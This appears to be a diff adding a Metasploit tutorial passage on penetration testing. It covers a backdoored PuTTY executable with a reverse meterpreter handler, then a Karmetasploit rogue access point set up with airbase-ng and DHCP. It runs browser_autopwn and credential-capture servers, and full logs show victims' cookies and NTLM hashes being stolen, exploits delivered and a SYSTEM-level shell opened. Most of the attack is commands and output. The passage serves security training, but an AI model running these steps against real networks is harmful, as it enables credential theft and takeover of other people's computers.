+ x86/shikata_ga_nai chosen with final size 380
+ Payload size: 380 bytes
+ Saved as: puttyX.exe
+ root@kali:/var/www#
+
+Since we have selected a reverse meterpreter payload, we need to setup the exploit handler to handle the connection back to our attacking machine.
+
+::
+
+  msf > use exploit/multi/handler
+ msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+ PAYLOAD => windows/meterpreter/reverse_tcp
+ msf exploit(handler) > set LHOST 192.168.1.101
+ LHOST => 192.168.1.101
+ msf exploit(handler) > set LPORT 443
+ LPORT => 443
+ msf exploit(handler) > exploit
+
+ [*] Started reverse handler on 192.168.1.101:443
+ [*] Starting the payload handler...
+
+
+As soon as our victim downloads and executes our special version of PuTTY, we are presented with a meterpreter shell on the target.
+
+::
+
+  [*] Sending stage (749056 bytes) to 192.168.1.201
+ [*] Meterpreter session 1 opened (192.168.1.101:443 -> 192.168.1.201:1189) at Sat Feb 05 08:54:25 -0700 2011
+
+ meterpreter > getuid
+ Server username: XEN-XP-SPLOIT\Administrator
+ meterpreter >
+
+
+Karmetasploit
+==================
+
+Karmetasploit is a great function within Metasploit, allowing you to fake access points, capture passwords, harvest data, and conduct browser attacks against clients.
+
+Karmetasploit Configuration
+^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+There is a bit of setup required to get Karmetasploit up and going on Kali Linux Rolling. The first step is to obtain the run control file for Karmetasploit:
+
+
+::
+
+  root@kali:~# wget https://www.offensive-security.com/wp-content/uploads/2015/04/karma.rc_.txt
+ --2015-04-03 16:17:27-- https://www.offensive-security.com/downloads/karma.rc
+ Resolving www.offensive-security.com (www.offensive-security.com)... 198.50.176.211
+ Connecting to www.offensive-security.com (www.offensive-security.com)|198.50.176.211|:443... connected.
+ HTTP request sent, awaiting response... 200 OK
+ Length: 1089 (1.1K) [text/plain]
+
+ Saving to: `karma.rc' 100%[======================================>] 1,089 --.-K/s in 0s
+
+ 2015-04-03 16:17:28 (35.9 MB/s) - `karma.rc' saved [1089/1089]
+ root@kali:~#
+
+Having obtained that requirement, we need to set up a bit of the infrastructure that will be required. When clients attach to the fake AP we run, they will be expecting to be assigned an IP address. As such, we need to put a DHCP server in place. Let’s install a DHCP server onto Kali.
+
+::
+
+  root@kali:~# apt update
+ ...snip...
+ root@kali:~# apt -y install isc-dhcp-server
+ Reading package lists... Done
+ Building dependency tree
+ Reading state information... Done
+ ...snip...
+ root@kali:~#
+
+
+Next, let’s configure our ‘dhcpd.conf’ file. We will replace the configuration file with the following output:
+
+
+::
+
+  root@kali:~# cat /etc/dhcp/dhcpd.conf
+ option domain-name-servers 10.0.0.1;
+
+ default-lease-time 60;
+ max-lease-time 72;
+
+ ddns-update-style none;
+
+ authoritative;
+
+ log-facility local7;
+
+ subnet 10.0.0.0 netmask 255.255.255.0 {
+  range 10.0.0.100 10.0.0.254;
+  option routers 10.0.0.1;
+  option domain-name-servers 10.0.0.1;
+ }
+ root@kali:~#
+
+Then we need to install a couple of requirements.
+
+::
+
+  root@kali:~# apt -y install libsqlite3-dev
+ Reading package lists... Done
+ Building dependency tree
+ Reading state information... Done
+ ...snip...
+ root@kali:~# gem install activerecord sqlite3
+ Fetching: activerecord-5.0.0.1.gem (100%)
+ Successfully installed activerecord-5.0.0.1
+ Parsing documentation for activerecord-5.0.0.1
+ Installing ri documentation for activerecord-5.0.0.1
+ Done installing documentation for activerecord after 7 seconds
+ Fetching: sqlite3-1.3.12.gem (100%)
+ Building native extensions.  This could take a while...
+ Successfully installed sqlite3-1.3.12
+ Parsing documentation for sqlite3-1.3.12
+ Installing ri documentation for sqlite3-1.3.12
+ Done installing documentation for sqlite3 after 0 seconds
+ 2 gems installed
+ root@kali:~#
+
+Now we are ready to go. First off, we need to locate our wireless card, then start our wireless adapter in monitor mode with airmon-ng. Afterwards we utilize airbase-ng to start a new wireless network.
+
+::
+
+  root@kali:~# airmon-ng
+
+
+ PHY     Interface       Driver          Chipset
+
+ phy0	wlan0	        ath9k_htc	Atheros Communications, Inc. AR9271 802.11n
+
+ root@kali:~# airmon-ng start wlan0
+
+ PHY	Interface	Driver		Chipset
+
+ phy0	wlan0		ath9k_htc	Atheros Communications, Inc. AR9271 802.11n
+
+		(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
+		(mac80211 station mode vif disabled for [phy0]wlan0)
+
+ Found 2 processes that could cause trouble.
+ If airodump-ng, aireplay-ng or airtun-ng stops working after
+ a short period of time, you may want to kill (some of) them!
+
+ PID     Name
+ 693     dhclient
+ 934     wpa_supplicant
+
+ root@kali:~# airbase-ng -P -C 30 -e "U R PWND" -v wlan0mon
+ For information, no action required: Using gettimeofday() instead of /dev/rtc
+ 22:52:25  Created tap interface at0
+ 22:52:25  Trying to set MTU on at0 to 1500
+ 22:52:25  Trying to set MTU on wlan0mon to 1800
+ 22:52:25  Access Point with BSSID 00:C0:CA:82:D9:63 started.
+
+
+Airbase-ng has created a new interface for us, “at0”. This is the interface we will now utilize. We will now assign ourselves an IP address.
+
+
+::
+
+  root@kali:~# ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
+ root@kali:~#
+
+Before we run our DHCP server, we need to create a lease database, then we can get it to listening on our new interface.
+
+::
+
+  root@kali:~# touch /var/lib/dhcp/dhcpd.leases
+ root@kali:~# dhcpd -cf /etc/dhcp/dhcpd.conf at0
+ Internet Systems Consortium DHCP Server 4.3.3
+ Copyright 2004-2015 Internet Systems Consortium.
+ All rights reserved.
+ For info, please visit https://www.isc.org/software/dhcp/
+ Config file: /etc/dhcp/dhcpd.conf
+ Database file: /var/lib/dhcp/dhcpd.leases
+ PID file: /var/run/dhcpd.pid
+ Wrote 0 leases to leases file.
+ Listening on LPF/at0/00:c0:ca:82:d9:63/10.0.0.0/24
+ Sending on   LPF/at0/00:c0:ca:82:d9:63/10.0.0.0/24
+ Sending on   Socket/fallback/fallback-net
+
+ root@kali:~# ps aux | grep [d]hcpd
+ root      2373  0.0  0.4  28448  9532 ?        Ss   13:45   0:00 dhcpd -cf /etc/dhcp/dhcpd.conf at0
+ root@kali:~#
+
+
+Karmetasploit in Action
+^^^^^^^^^^^^^^^^^^^^^^^^
+
+Now, with everything ready, all that is left is to run Karmetasploit! We start up Metasploit, feeding it our run control file.
+
+::
+
+  root@kali:~# msfconsole -q -r karma.rc_.txt
+
+ [*] Processing karma.rc_.txt for ERB directives.
+ resource (karma.rc_.txt)> db_connect postgres:toor@127.0.0.1/msfbook
+ resource (karma.rc_.txt)> use auxiliary/server/browser_autopwn
+ resource (karma.rc_.txt)> setg AUTOPWN_HOST 10.0.0.1
+ AUTOPWN_HOST => 10.0.0.1
+ resource (karma.rc_.txt)> setg AUTOPWN_PORT 55550
+ AUTOPWN_PORT => 55550
+ resource (karma.rc_.txt)> setg AUTOPWN_URI /ads
+ AUTOPWN_URI => /ads
+ resource (karma.rc_.txt)> set LHOST 10.0.0.1
+ LHOST => 10.0.0.1
+ resource (karma.rc_.txt)> set LPORT 45000
+ LPORT => 45000
+ resource (karma.rc_.txt)> set SRVPORT 55550
+ SRVPORT => 55550
+ resource (karma.rc_.txt)> set URIPATH /ads
+ URIPATH => /ads
+ resource (karma.rc_.txt)> run
+ [*] Auxiliary module execution completed
+ resource (karma.rc_.txt)> use auxiliary/server/capture/pop3
+ resource (karma.rc_.txt)> set SRVPORT 110
+ SRVPORT => 110
+ resource (karma.rc_.txt)> set SSL false
+ SSL => false
+ resource (karma.rc_.txt)> run
+ [*] Auxiliary module execution completed
+ resource (karma.rc_.txt)> use auxiliary/server/capture/pop3
+ resource (karma.rc_.txt)> set SRVPORT 995
+ SRVPORT => 995
+ resource (karma.rc_.txt)> set SSL true
+ SSL => true
+ resource (karma.rc_.txt)> run
+ [*] Auxiliary module execution completed
+ resource (karma.rc_.txt)> use auxiliary/server/capture/ftp
+ [*] Setup
+ resource (karma.rc_.txt)> run
+ [*] Listening on 0.0.0.0:110...
+ [*] Auxiliary module execution completed
+ [*] Server started.
+
+
+ msf auxiliary(http) >
+
+
+At this point, we are up and running. All that is required now is for a client to connect to the fake access point. When they connect, they will see a fake “captive portal” style screen regardless of what website they try to connect to. You can look through your output, and see that a wide number of different servers are started. From DNS, POP3, IMAP, to various HTTP servers, we have a wide net now cast to capture various bits of information.
+
+Now lets see what happens when a client connects to the fake AP we have set up.
+
+::
+
+  msf auxiliary(http) >
+ [*] DNS 10.0.0.100:1276 XID 87 (IN::A www.msn.com)
+ [*] DNS 10.0.0.100:1276 XID 87 (IN::A www.msn.com)
+ [*] HTTP REQUEST 10.0.0.100 > www.msn.com:80 GET / Windows IE 5.01 cookies=MC1=V=3&GUID=e2eabc69be554e3587acce84901a53d3; MUID=E7E065776DBC40099851B16A38DB8275; mh=MSFT; CULTURE=EN-US; zip=z:68101|la:41.26|lo:-96.013|c:US|hr:1; FlightGroupId=14; FlightId=BasePage; hpsvr=M:5|F:5|T:5|E:5|D:blu|W:F; hpcli=W.H|L.|S.|R.|U.L|C.|H.; ushpwea=wc:USNE0363; wpv=2
+ [*] DNS 10.0.0.100:1279 XID 88 (IN::A adwords.google.com)
+ [*] DNS 10.0.0.100:1279 XID 88 (IN::A adwords.google.com)
+ [*] DNS 10.0.0.100:1280 XID 89 (IN::A blogger.com)
+ [*] DNS 10.0.0.100:1280 XID 89 (IN::A blogger.com)
+ ...snip...
+ [*] DNS 10.0.0.100:1289 XID 95 (IN::A gmail.com)
+ [*] DNS 10.0.0.100:1289 XID 95 (IN::A gmail.com)
+ [*] DNS 10.0.0.100:1289 XID 95 (IN::A gmail.com)
+ [*] DNS 10.0.0.100:1292 XID 96 (IN::A gmail.google.com)
+ [*] DNS 10.0.0.100:1292 XID 96 (IN::A gmail.google.com)
+ [*] DNS 10.0.0.100:1292 XID 96 (IN::A gmail.google.com)
+ [*] DNS 10.0.0.100:1292 XID 96 (IN::A gmail.google.com)
+ [*] DNS 10.0.0.100:1292 XID 96 (IN::A gmail.google.com)
+ [*] Request '/ads' from 10.0.0.100:1278
+ [*] Recording detection from User-Agent
+ [*] DNS 10.0.0.100:1292 XID 96 (IN::A gmail.google.com)
+ [*] Browser claims to be MSIE 5.01, running on Windows 2000
+ [*] DNS 10.0.0.100:1293 XID 97 (IN::A google.com)
+ [*] Error: SQLite3::SQLException cannot start a transaction within a transaction /usr/lib/ruby/1.8/sqlite3/errors.rb:62:in `check'/usr/lib/ruby/1.8/sqlite3/resultset.rb:47:in `check'/usr/lib/ruby/1.8/sqlite3/resultset.rb:39:in `commence'/usr/lib/ruby/1.8/sqlite3
+ ...snip...
+ [*] HTTP REQUEST 10.0.0.100 > ecademy.com:80 GET /forms.html Windows IE 5.01 cookies=
+ [*] HTTP REQUEST 10.0.0.100 > facebook.com:80 GET /forms.html Windows IE 5.01 cookies=
+ [*] HTTP REQUEST 10.0.0.100 > gather.com:80 GET /forms.html Windows IE 5.01 cookies=
+ [*] HTTP REQUEST 10.0.0.100 > gmail.com:80 GET /forms.html Windows IE 5.01 cookies=
+ [*] HTTP REQUEST 10.0.0.100 > gmail.google.com:80 GET /forms.html Windows IE 5.01 cookies=PREF=ID=474686c582f13be6:U=ecaec12d78faa1ba:TM=1241334857:LM=1241334880:S=snePRUjY-zgcXpEV; NID=22=nFGYMj-l7FaT7qz3zwXjen9_miz8RDn_rA-lP_IbBocsb3m4eFCH6hI1ae23ghwenHaEGltA5hiZbjA2gk8i7m8u9Za718IFyaDEJRw0Ip1sT8uHHsJGTYfpAlne1vB8
+ [*] HTTP REQUEST 10.0.0.100 > google.com:80 GET /forms.html Windows IE 5.01 cookies=PREF=ID=474686c582f13be6:U=ecaec12d78faa1ba:TM=1241334857:LM=1241334880:S=snePRUjY-zgcXpEV; NID=22=nFGYMj-l7FaT7qz3zwXjen9_miz8RDn_rA-lP_IbBocsb3m4eFCH6hI1ae23ghwenHaEGltA5hiZbjA2gk8i7m8u9Za718IFyaDEJRw0Ip1sT8uHHsJGTYfpAlne1vB8
+ [*] HTTP REQUEST 10.0.0.100 > linkedin.com:80 GET /forms.html Windows IE 5.01 cookies=
+ [*] HTTP REQUEST 10.0.0.100 > livejournal.com:80 GET /forms.html Windows IE 5.01 cookies=
+ [*] HTTP REQUEST 10.0.0.100 > monster.com:80 GET /forms.html Windows IE 5.01 cookies=
+ [*] HTTP REQUEST 10.0.0.100 > myspace.com:80 GET /forms.html Windows IE 5.01 cookies=
+ [*] HTTP REQUEST 10.0.0.100 > plaxo.com:80 GET /forms.html Windows IE 5.01 cookies=
+ [*] HTTP REQUEST 10.0.0.100 > ryze.com:80 GET /forms.html Windows IE 5.01 cookies=
+ [*] Sending MS03-020 Internet Explorer Object Type to 10.0.0.100:1278...
+ [*] HTTP REQUEST 10.0.0.100 > slashdot.org:80 GET /forms.html Windows IE 5.01 cookies=
+ [*] Received 10.0.0.100:1360 LMHASH:00 NTHASH: OS:Windows 2000 2195 LM:Windows 2000 5.0
+ ...snip...
+ [*] HTTP REQUEST 10.0.0.100 > www.monster.com:80 GET /forms.html Windows IE 5.01 cookies=
+ [*] Received 10.0.0.100:1362 TARGET\P0WN3D LMHASH:47a8cfba21d8473f9cc1674cedeba0fa6dc1c2a4dd904b72 NTHASH:ea389b305cd095d32124597122324fc470ae8d9205bdfc19 OS:Windows 2000 2195 LM:Windows 2000 5.0
+ [*] Authenticating to 10.0.0.100 as TARGET\P0WN3D...
+ [*] HTTP REQUEST 10.0.0.100 > www.myspace.com:80 GET /forms.html Windows IE 5.01 cookies=
+ [*] AUTHENTICATED as TARGETP0WN3D...
+ [*] Connecting to the ADMIN$ share...
+ [*] HTTP REQUEST 10.0.0.100 > www.plaxo.com:80 GET /forms.html Windows IE 5.01 cookies=
+ [*] Regenerating the payload...
+ [*] Uploading payload...
+ [*] HTTP REQUEST 10.0.0.100 > www.ryze.com:80 GET /forms.html Windows IE 5.01 cookies=
+ [*] HTTP REQUEST 10.0.0.100 > www.slashdot.org:80 GET /forms.html Windows IE 5.01 cookies=
+ [*] HTTP REQUEST 10.0.0.100 > www.twitter.com:80 GET /forms.html Windows IE 5.01 cookies=
+ [*] HTTP REQUEST 10.0.0.100 > www.xing.com:80 GET /forms.html Windows IE 5.01 cookies=
+ [*] HTTP REQUEST 10.0.0.100 > www.yahoo.com:80 GET /forms.html Windows IE 5.01 cookies=
+ [*] HTTP REQUEST 10.0.0.100 > xing.com:80 GET /forms.html Windows IE 5.01 cookies=
+ [*] HTTP REQUEST 10.0.0.100 > yahoo.com:80 GET /forms.html Windows IE 5.01 cookies=
+ [*] Created UxsjordQ.exe...
+ [*] HTTP REQUEST 10.0.0.100 > ziggs.com:80 GET /forms.html Windows IE 5.01 cookies=
+ [*] Connecting to the Service Control Manager...
+ [*] HTTP REQUEST 10.0.0.100 > care.com:80 GET / Windows IE 5.01 cookies=
+ [*] HTTP REQUEST 10.0.0.100 > www.gather.com:80 GET /forms.html Windows IE 5.01 cookies=
+ [*] HTTP REQUEST 10.0.0.100 > www.ziggs.com:80 GET /forms.html Windows IE 5.01 cookies=
+ [*] Obtaining a service manager handle...
+ [*] Creating a new service...
+ [*] Closing service handle...
+ [*] Opening service...
+ [*] Starting the service...
+ [*] Transmitting intermediate stager for over-sized stage...(191 bytes)
+ [*] Removing the service...
+ [*] Closing service handle...
+ [*] Deleting UxsjordQ.exe...
+ [*] Sending Access Denied to 10.0.0.100:1362 TARGET\P0WN3D
+ [*] Received 10.0.0.100:1362 LMHASH:00 NTHASH: OS:Windows 2000 2195 LM:Windows 2000 5.0
+ [*] Sending Access Denied to 10.0.0.100:1362
+ [*] Received 10.0.0.100:1365 TARGET\P0WN3D LMHASH:3cd170ac4f807291a1b90da20bb8eb228cf50aaf5373897d NTHASH:ddb2b9bed56faf557b1a35d3687fc2c8760a5b45f1d1f4cd OS:Windows 2000 2195 LM:Windows 2000 5.0
+ [*] Authenticating to 10.0.0.100 as TARGET\P0WN3D...
+ [*] AUTHENTICATED as TARGETP0WN3D...
+ [*] Ignoring request from 10.0.0.100, attack already in progress.
+ [*] Sending Access Denied to 10.0.0.100:1365 TARGET\P0WN3D
+ [*] Sending Apple QuickTime 7.1.3 RTSP URI Buffer Overflow to 10.0.0.100:1278...
+ [*] Sending stage (2650 bytes)
+ [*] Sending iPhone MobileSafari LibTIFF Buffer Overflow to 10.0.0.100:1367...
+ [*] HTTP REQUEST 10.0.0.100 > www.care2.com:80 GET / Windows IE 5.01 cookies=
+ [*] Sleeping before handling stage...
+ [*] HTTP REQUEST 10.0.0.100 > www.yahoo.com:80 GET / Windows IE 5.01 cookies=
+ [*] HTTP REQUEST 10.0.0.100 > yahoo.com:80 GET / Windows IE 5.01 cookies=
+ [*] Uploading DLL (75787 bytes)...
+ [*] Upload completed.
+ [*] Migrating to lsass.exe...
+ [*] Current server process: rundll32.exe (848)
+ [*] New server process: lsass.exe (232)
+ [*] Meterpreter session 1 opened (10.0.0.1:45017 -> 10.0.0.100:1364)
+
+ msf auxiliary(http) > sessions -l
+
+ Active sessions
+ ===============
+
+  Id  Description  Tunnel
+  --  -----------  ------
+  1   Meterpreter  10.0.0.1:45017 -> 10.0.0.100:1364
+
+
+Karmetasploit Attack Analysis
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Wow! That was a lot of output! Please take some time to read through the output, and try to understand what is happening.
+
+Let’s break down some of the output a bit here
+
+::
+
+  [*] DNS 10.0.0.100:1284 XID 92 (IN::A ecademy.com)
+ [*] DNS 10.0.0.100:1286 XID 93 (IN::A facebook.com)
+ [*] DNS 10.0.0.100:1286 XID 93 (IN::A facebook.com)
+ [*] DNS 10.0.0.100:1287 XID 94 (IN::A gather.com)
+ [*] DNS 10.0.0.100:1287 XID 94 (IN::A gather.com)
+
+Here we see DNS lookups which are occurring. Most of these are initiated by Karmetasploit in attempts to gather information from the client.
+
+::
+
+  [*] HTTP REQUEST 10.0.0.100 > gmail.google.com:80 GET /forms.html Windows IE 5.01 cook
+ ies=PREF=ID=474686c582f13be6:U=ecaec12d78faa1ba:TM=1241334857:LM=1241334880: S=snePRUjY-zgcXpEV;NID=22=nFGYMj-l7FaT7qz3zwXjen9_miz8RDn_rA-lP_IbBocsb3m4eFCH6h I1ae23ghwenHaEGltA5hiZbjA2gk8i7m8u9Za718IFyaDEJRw0Ip1sT8uHHsJGTYfpAlne1vB8
+
+ [*] HTTP REQUEST 10.0.0.100 > google.com:80 GET /forms.html Windows IE 5.01 cookies=PREF=ID=474686c582f13be6:U=ecaec12d78faa1ba:TM=1241334857:LM=1241334880: S=snePRUjY-zgcXpEV;NID=22=nFGYMj-l7FaT7qz3zwXjen9_miz8RDn_rA-lP_IbBocsb3m4e FCH6hI1ae23g hwenHaEGltA5hiZbjA2gk8i7m8u9Za718IFyaDEJRw0Ip1sT8uHHsJGTYfpAlne1vB8
+
+
+Here we can see Karmetasploit collecting cookie information from the client. This could be useful information to use in attacks against the user later on.
+
+::
+
+  [*] Received 10.0.0.100:1362 TARGET\P0WN3D LMHASH:47a8cfba21d8473f9cc1674cedeba0fa6dc1c2a4dd904b72 NTHASH:ea389b305cd095d32124597122324fc470ae8d9205bdfc19 OS:Windows 2000 2195 LM:Windows 2000 5.0
+ [*] Authenticating to 10.0.0.100 as TARGET\P0WN3D...
+ [*] AUTHENTICATED as TARGET\P0WN3D...
+ [*] Connecting to the ADMIN$ share...
+ [*] Regenerating the payload...
+ [*] Uploading payload...
+ [*] Obtaining a service manager handle...
+ [*] Creating a new service...
+ [*] Closing service handle...
+ [*] Opening service...
+ [*] Starting the service...
+ [*] Transmitting intermediate stager for over-sized stage...(191 bytes)
+ [*] Removing the service...
+ [*] Closing service handle...
+ [*] Deleting UxsjordQ.exe...
+ [*] Sending Access Denied to 10.0.0.100:1362 TARGET\P0WN3D
+ [*] Received 10.0.0.100:1362 LMHASH:00 NTHASH: OS:Windows 2000 2195 LM:Windows 2000 5.0
+ [*] Sending Access Denied to 10.0.0.100:1362
+ [*] Received 10.0.0.100:1365 TARGET\P0WN3D LMHASH:3cd170ac4f807291a1b90da20bb8eb228cf50aaf5373897d NTHASH:ddb2b9bed56faf557b1a35d3687fc2c8760a5b45f1d1f4cd OS:Windows 2000 2195 LM:Windows 2000 5.0
+ [*] Authenticating to 10.0.0.100 as TARGET\P0WN3D...
+ [*] AUTHENTICATED as TARGET\P0WN3D...
+ [*] Ignoring request from 10.0.0.100, attack already in progress.
+ [*] Sending Access Denied to 10.0.0.100:1365 TARGET\P0WN3D
+ [*] Sending Apple QuickTime 7.1.3 RTSP URI Buffer Overflow to 10.0.0.100:1278...
+ [*] Sending stage (2650 bytes)
+ [*] Sending iPhone MobileSafari LibTIFF Buffer Overflow to 10.0.0.100:1367...
+ [*] HTTP REQUEST 10.0.0.100 > www.care2.com:80 GET / Windows IE 5.01 cookies=
+ [*] Sleeping before handling stage...
+ [*] HTTP REQUEST 10.0.0.100 > www.yahoo.com:80 GET / Windows IE 5.01 cookies=
+ [*] HTTP REQUEST 10.0.0.100 > yahoo.com:80 GET / Windows IE 5.01 cookies=
+ [*] Uploading DLL (75787 bytes)...
+ [*] Upload completed.
+ [*] Migrating to lsass.exe...
+ [*] Current server process: rundll32.exe (848)
+ [*] New server process: lsass.exe (232)
+ [*] Meterpreter session 1 opened (10.0.0.1:45017 -> 10.0.0.100:1364)
+
+
+Here is where it gets really interesting! We have obtained the password hashes from the system, which can then be used to identify the actual passwords. This is followed by the creation of a Meterpreter session.
+
+Now we have access to the system, lets see what we can do with it.
+
+::
+
+  msf auxiliary(http) > sessions -i 1
+ [*] Starting interaction with 1...
+
+ meterpreter > ps
+
+ Process list
+ ============
+
+    PID   Name               Path
+    ---   ----               ----
+    144   smss.exe           \SystemRoot\System32\smss.exe
+    172   csrss.exe          \??\C:\WINNT\system32\csrss.exe
+    192   winlogon.exe       \??\C:\WINNT\system32\winlogon.exe
+    220   services.exe       C:\WINNT\system32\services.exe
+    232   lsass.exe          C:\WINNT\system32\lsass.exe
+    284   firefox.exe        C:\Program Files\Mozilla Firefox\firefox.exe
+    300   KodakImg.exe       C:\Program Files\Windows NT\Accessories\ImageVueKodakImg.exe
+    396   svchost.exe        C:\WINNT\system32\svchost.exe
+    416   spoolsv.exe        C:\WINNT\system32\spoolsv.exe
+    452   svchost.exe        C:\WINNT\System32\svchost.exe
+    488   regsvc.exe         C:\WINNT\system32\regsvc.exe
+    512   MSTask.exe         C:\WINNT\system32\MSTask.exe
+    568   VMwareService.exe  C:\Program Files\VMware\VMware Tools\VMwareService.exe
+    632   WinMgmt.exe        C:\WINNT\System32\WBEM\WinMgmt.exe
+    696   TPAutoConnSvc.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe
+    760   Explorer.exe       C:\WINNT\Explorer.exe
+    832   VMwareTray.exe     C:\Program Files\VMware\VMware Tools\VMwareTray.exe
+    848   rundll32.exe       C:\WINNT\system32\rundll32.exe
+    860   VMwareUser.exe     C:\Program Files\VMware\VMware Tool\VMwareUser.exe
+    884   RtWLan.exe         C:\Program Files\ASUS WiFi-AP Solo\RtWLan.exe
+    916   TPAutoConnect.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
+    952   SCardSvr.exe       C:\WINNT\System32\SCardSvr.exe
+    1168  IEXPLORE.EXE       C:\Program Files\Internet Explorer\IEXPLORE.EXE
+
+ meterpreter > ipconfig /all
+
+ VMware Accelerated AMD PCNet Adapter
+ Hardware MAC: 00:0c:29:85:81:55
+ IP Address  : 0.0.0.0
+ Netmask     : 0.0.0.0
+
+
+
+ Realtek RTL8187 Wireless LAN USB NIC
+ Hardware MAC: 00:c0:ca:1a:e7:d4
+ IP Address  : 10.0.0.100
+ Netmask     : 255.255.255.0
+
+
+
+ MS TCP Loopback interface
+ Hardware MAC: 00:00:00:00:00:00
+ IP Address  : 127.0.0.1
+ Netmask     : 255.0.0.0
+
+
+ meterpreter > pwd
+ C:\WINNT\system32
+ meterpreter > getuid
+ Server username: NT AUTHORITY\SYSTEM
+
+
+Wonderful. Just like any other vector, our Meterperter session is working just as we expected.
+
+However, there can be a lot that happens in Karmetasploit really fast and making use of the output to standard out may not be usable. Let’s look at another way to access the logged information. We will interact with the karma.db that is created in your home directory.
+
+Lets open it with sqlite, and dump the schema.
+
+::
+
+  root@kali:~# sqlite3 karma.db
+ SQLite version 3.5.9
+ Enter ".help" for instructions
+ sqlite> .schema
+ CREATE TABLE hosts (
+ 'id' INTEGER PRIMARY KEY NOT NULL,
+ 'created' TIMESTAMP,
+ 'address' VARCHAR(16) UNIQUE,
+ 'comm' VARCHAR(255),
+ 'name' VARCHAR(255),
+ 'state' VARCHAR(255),
+ 'desc' VARCHAR(1024),
+ 'os_name' VARCHAR(255),
+ 'os_flavor' VARCHAR(255),
+ 'os_sp' VARCHAR(255),
+ 'os_lang' VARCHAR(255),
+ 'arch' VARCHAR(255)
+ );
+ CREATE TABLE notes (
+ 'id' INTEGER PRIMARY KEY NOT NULL,
+ 'created' TIMESTAMP,
+ 'host_id' INTEGER,
+ 'ntype' VARCHAR(512),
+ 'data' TEXT
+ );
+ CREATE TABLE refs (
+ 'id' INTEGER PRIMARY KEY NOT NULL,
+ 'ref_id' INTEGER,
+ 'created' TIMESTAMP,
+ 'name' VARCHAR(512)
+ );
+ CREATE TABLE reports (
+ 'id' INTEGER PRIMARY KEY NOT NULL,
+ 'target_id' INTEGER,
+ 'parent_id' INTEGER,
+ 'entity' VARCHAR(50),
+ 'etype' VARCHAR(50),
+ 'value' BLOB,
+ 'notes' VARCHAR,
+ 'source' VARCHAR,
+ 'created' TIMESTAMP
+ );
+ CREATE TABLE requests (
+ 'host' VARCHAR(20),
+ 'port' INTEGER,
+ 'ssl' INTEGER,
+ 'meth' VARCHAR(20),
+ 'path' BLOB,
+ 'headers' BLOB,
+ 'query' BLOB,
+ 'body' BLOB,
+ 'respcode' VARCHAR(5),
+ 'resphead' BLOB,
+ 'response' BLOB,
+ 'created' TIMESTAMP
+ );
+ CREATE TABLE services (
+ 'id' INTEGER PRIMARY KEY NOT NULL,
+ 'host_id' INTEGER,
+ 'created' TIMESTAMP,
+ 'port' INTEGER NOT NULL,
+ 'proto' VARCHAR(16) NOT NULL,
+ 'state' VARCHAR(255),
+ 'name' VARCHAR(255),
+ 'desc' VARCHAR(1024)
+ );
+ CREATE TABLE targets (
+ 'id' INTEGER PRIMARY KEY NOT NULL,
+ 'host' VARCHAR(20),
+ 'port' INTEGER,
+ 'ssl' INTEGER,
+ 'selected' INTEGER
+ );
+ CREATE TABLE vulns (
+ 'id' INTEGER PRIMARY KEY NOT NULL,
+ 'service_id' INTEGER,
+ 'created' TIMESTAMP,
+ 'name' VARCHAR(1024),
+ 'data' TEXT
+ );
+ CREATE TABLE vulns_refs (
+ 'ref_id' INTEGER,
+ 'vuln_id' INTEGER
+ );
+
+
+With the information gained from the schema, let’s interact with the data we have gathered. First, we will list all the systems that we logged information from, then afterward, dump all the information we gathered while they were connected.
+
+::
+
+  sqlite> select * from hosts;
+ 1|2009-05-09 23:47:04|10.0.0.100|||alive||Windows|2000|||x86
+ sqlite> select * from notes where host_id = 1;
+ 1|2009-05-09 23:47:04|1|http_cookies|en-us.start2.mozilla.com __utma=183859642.1221819733.1241334886.1241334886.1241334886.1; __utmz=183859642.1241334886.1.1.utmccn=(organic)|utmcsr=google|utmctr=firefox|utmcmd=organic
+ 2|2009-05-09 23:47:04|1|http_request|en-us.start2.mozilla.com:80 GET /firefox Windows FF 1.9.0.10
+ 3|2009-05-09 23:47:05|1|http_cookies|adwords.google.com PREF=ID=ee60297d21c2a6e5:U=ecaec12d78faa1ba:TM=1241913986:LM=1241926890:GM=1:S=-p5nGxSz_oh1inss; NID=22=Yse3kJm0PoVwyYxj8GKC6LvlIqQMsruiPwQrcRRnLO_4Z0CzBRCIUucvroS_Rujrx6ov-tXzVKN2KJN4pEJdg25ViugPU0UZQhTuh80hNAPvvsq2_HARTNlG7dgUrBNq; SID=DQAAAHAAAADNMtnGqaWPkEBIxfsMQNzDt_f7KykHkPoYCRZn_Zen8zleeLyKr8XUmLvJVPZoxsdSBUd22TbQ3p1nc0TcoNHv7cEihkxtHl45zZraamzaji9qRC-XxU9po34obEBzGotphFHoAtLxgThdHQKWNQZq
+ 4|2009-05-09 23:47:05|1|http_request|adwords.google.com:80 GET /forms.html Windows FF 1.9.0.10
+ 5|2009-05-09 23:47:05|1|http_request|blogger.com:80 GET /forms.html Windows FF 1.9.0.10
+ 6|2009-05-09 23:47:05|1|http_request|care.com:80 GET /forms.html Windows FF 1.9.0.10
+ 7|2009-05-09 23:47:05|1|http_request|0.0.0.0:55550 GET /ads Windows Firefox 3.0.10
+ 8|2009-05-09 23:47:06|1|http_request|careerbuilder.com:80 GET /forms.html Windows FF 1.9.0.10
+ 9|2009-05-09 23:47:06|1|http_request|ecademy.com:80 GET /forms.html Windows FF 1.9.0.10
+ 10|2009-05-09 23:47:06|1|http_cookies|facebook.com datr=1241925583-120e39e88339c0edfd73fab6428ed813209603d31bd9d1dccccf3; ABT=::#b0ad8a8df29cc7bafdf91e67c86d58561st0:1242530384:A#2dd086ca2a46e9e50fff44e0ec48cb811st0:1242530384:B; s_vsn_facebookpoc_1=7269814957402
+ 11|2009-05-09 23:47:06|1|http_request|facebook.com:80 GET /forms.html Windows FF 1.9.0.10
+ 12|2009-05-09 23:47:06|1|http_request|gather.com:80 GET /forms.html Windows FF 1.9.0.10
+ 13|2009-05-09 23:47:06|1|http_request|gmail.com:80 GET /forms.html Windows FF 1.9.0.10
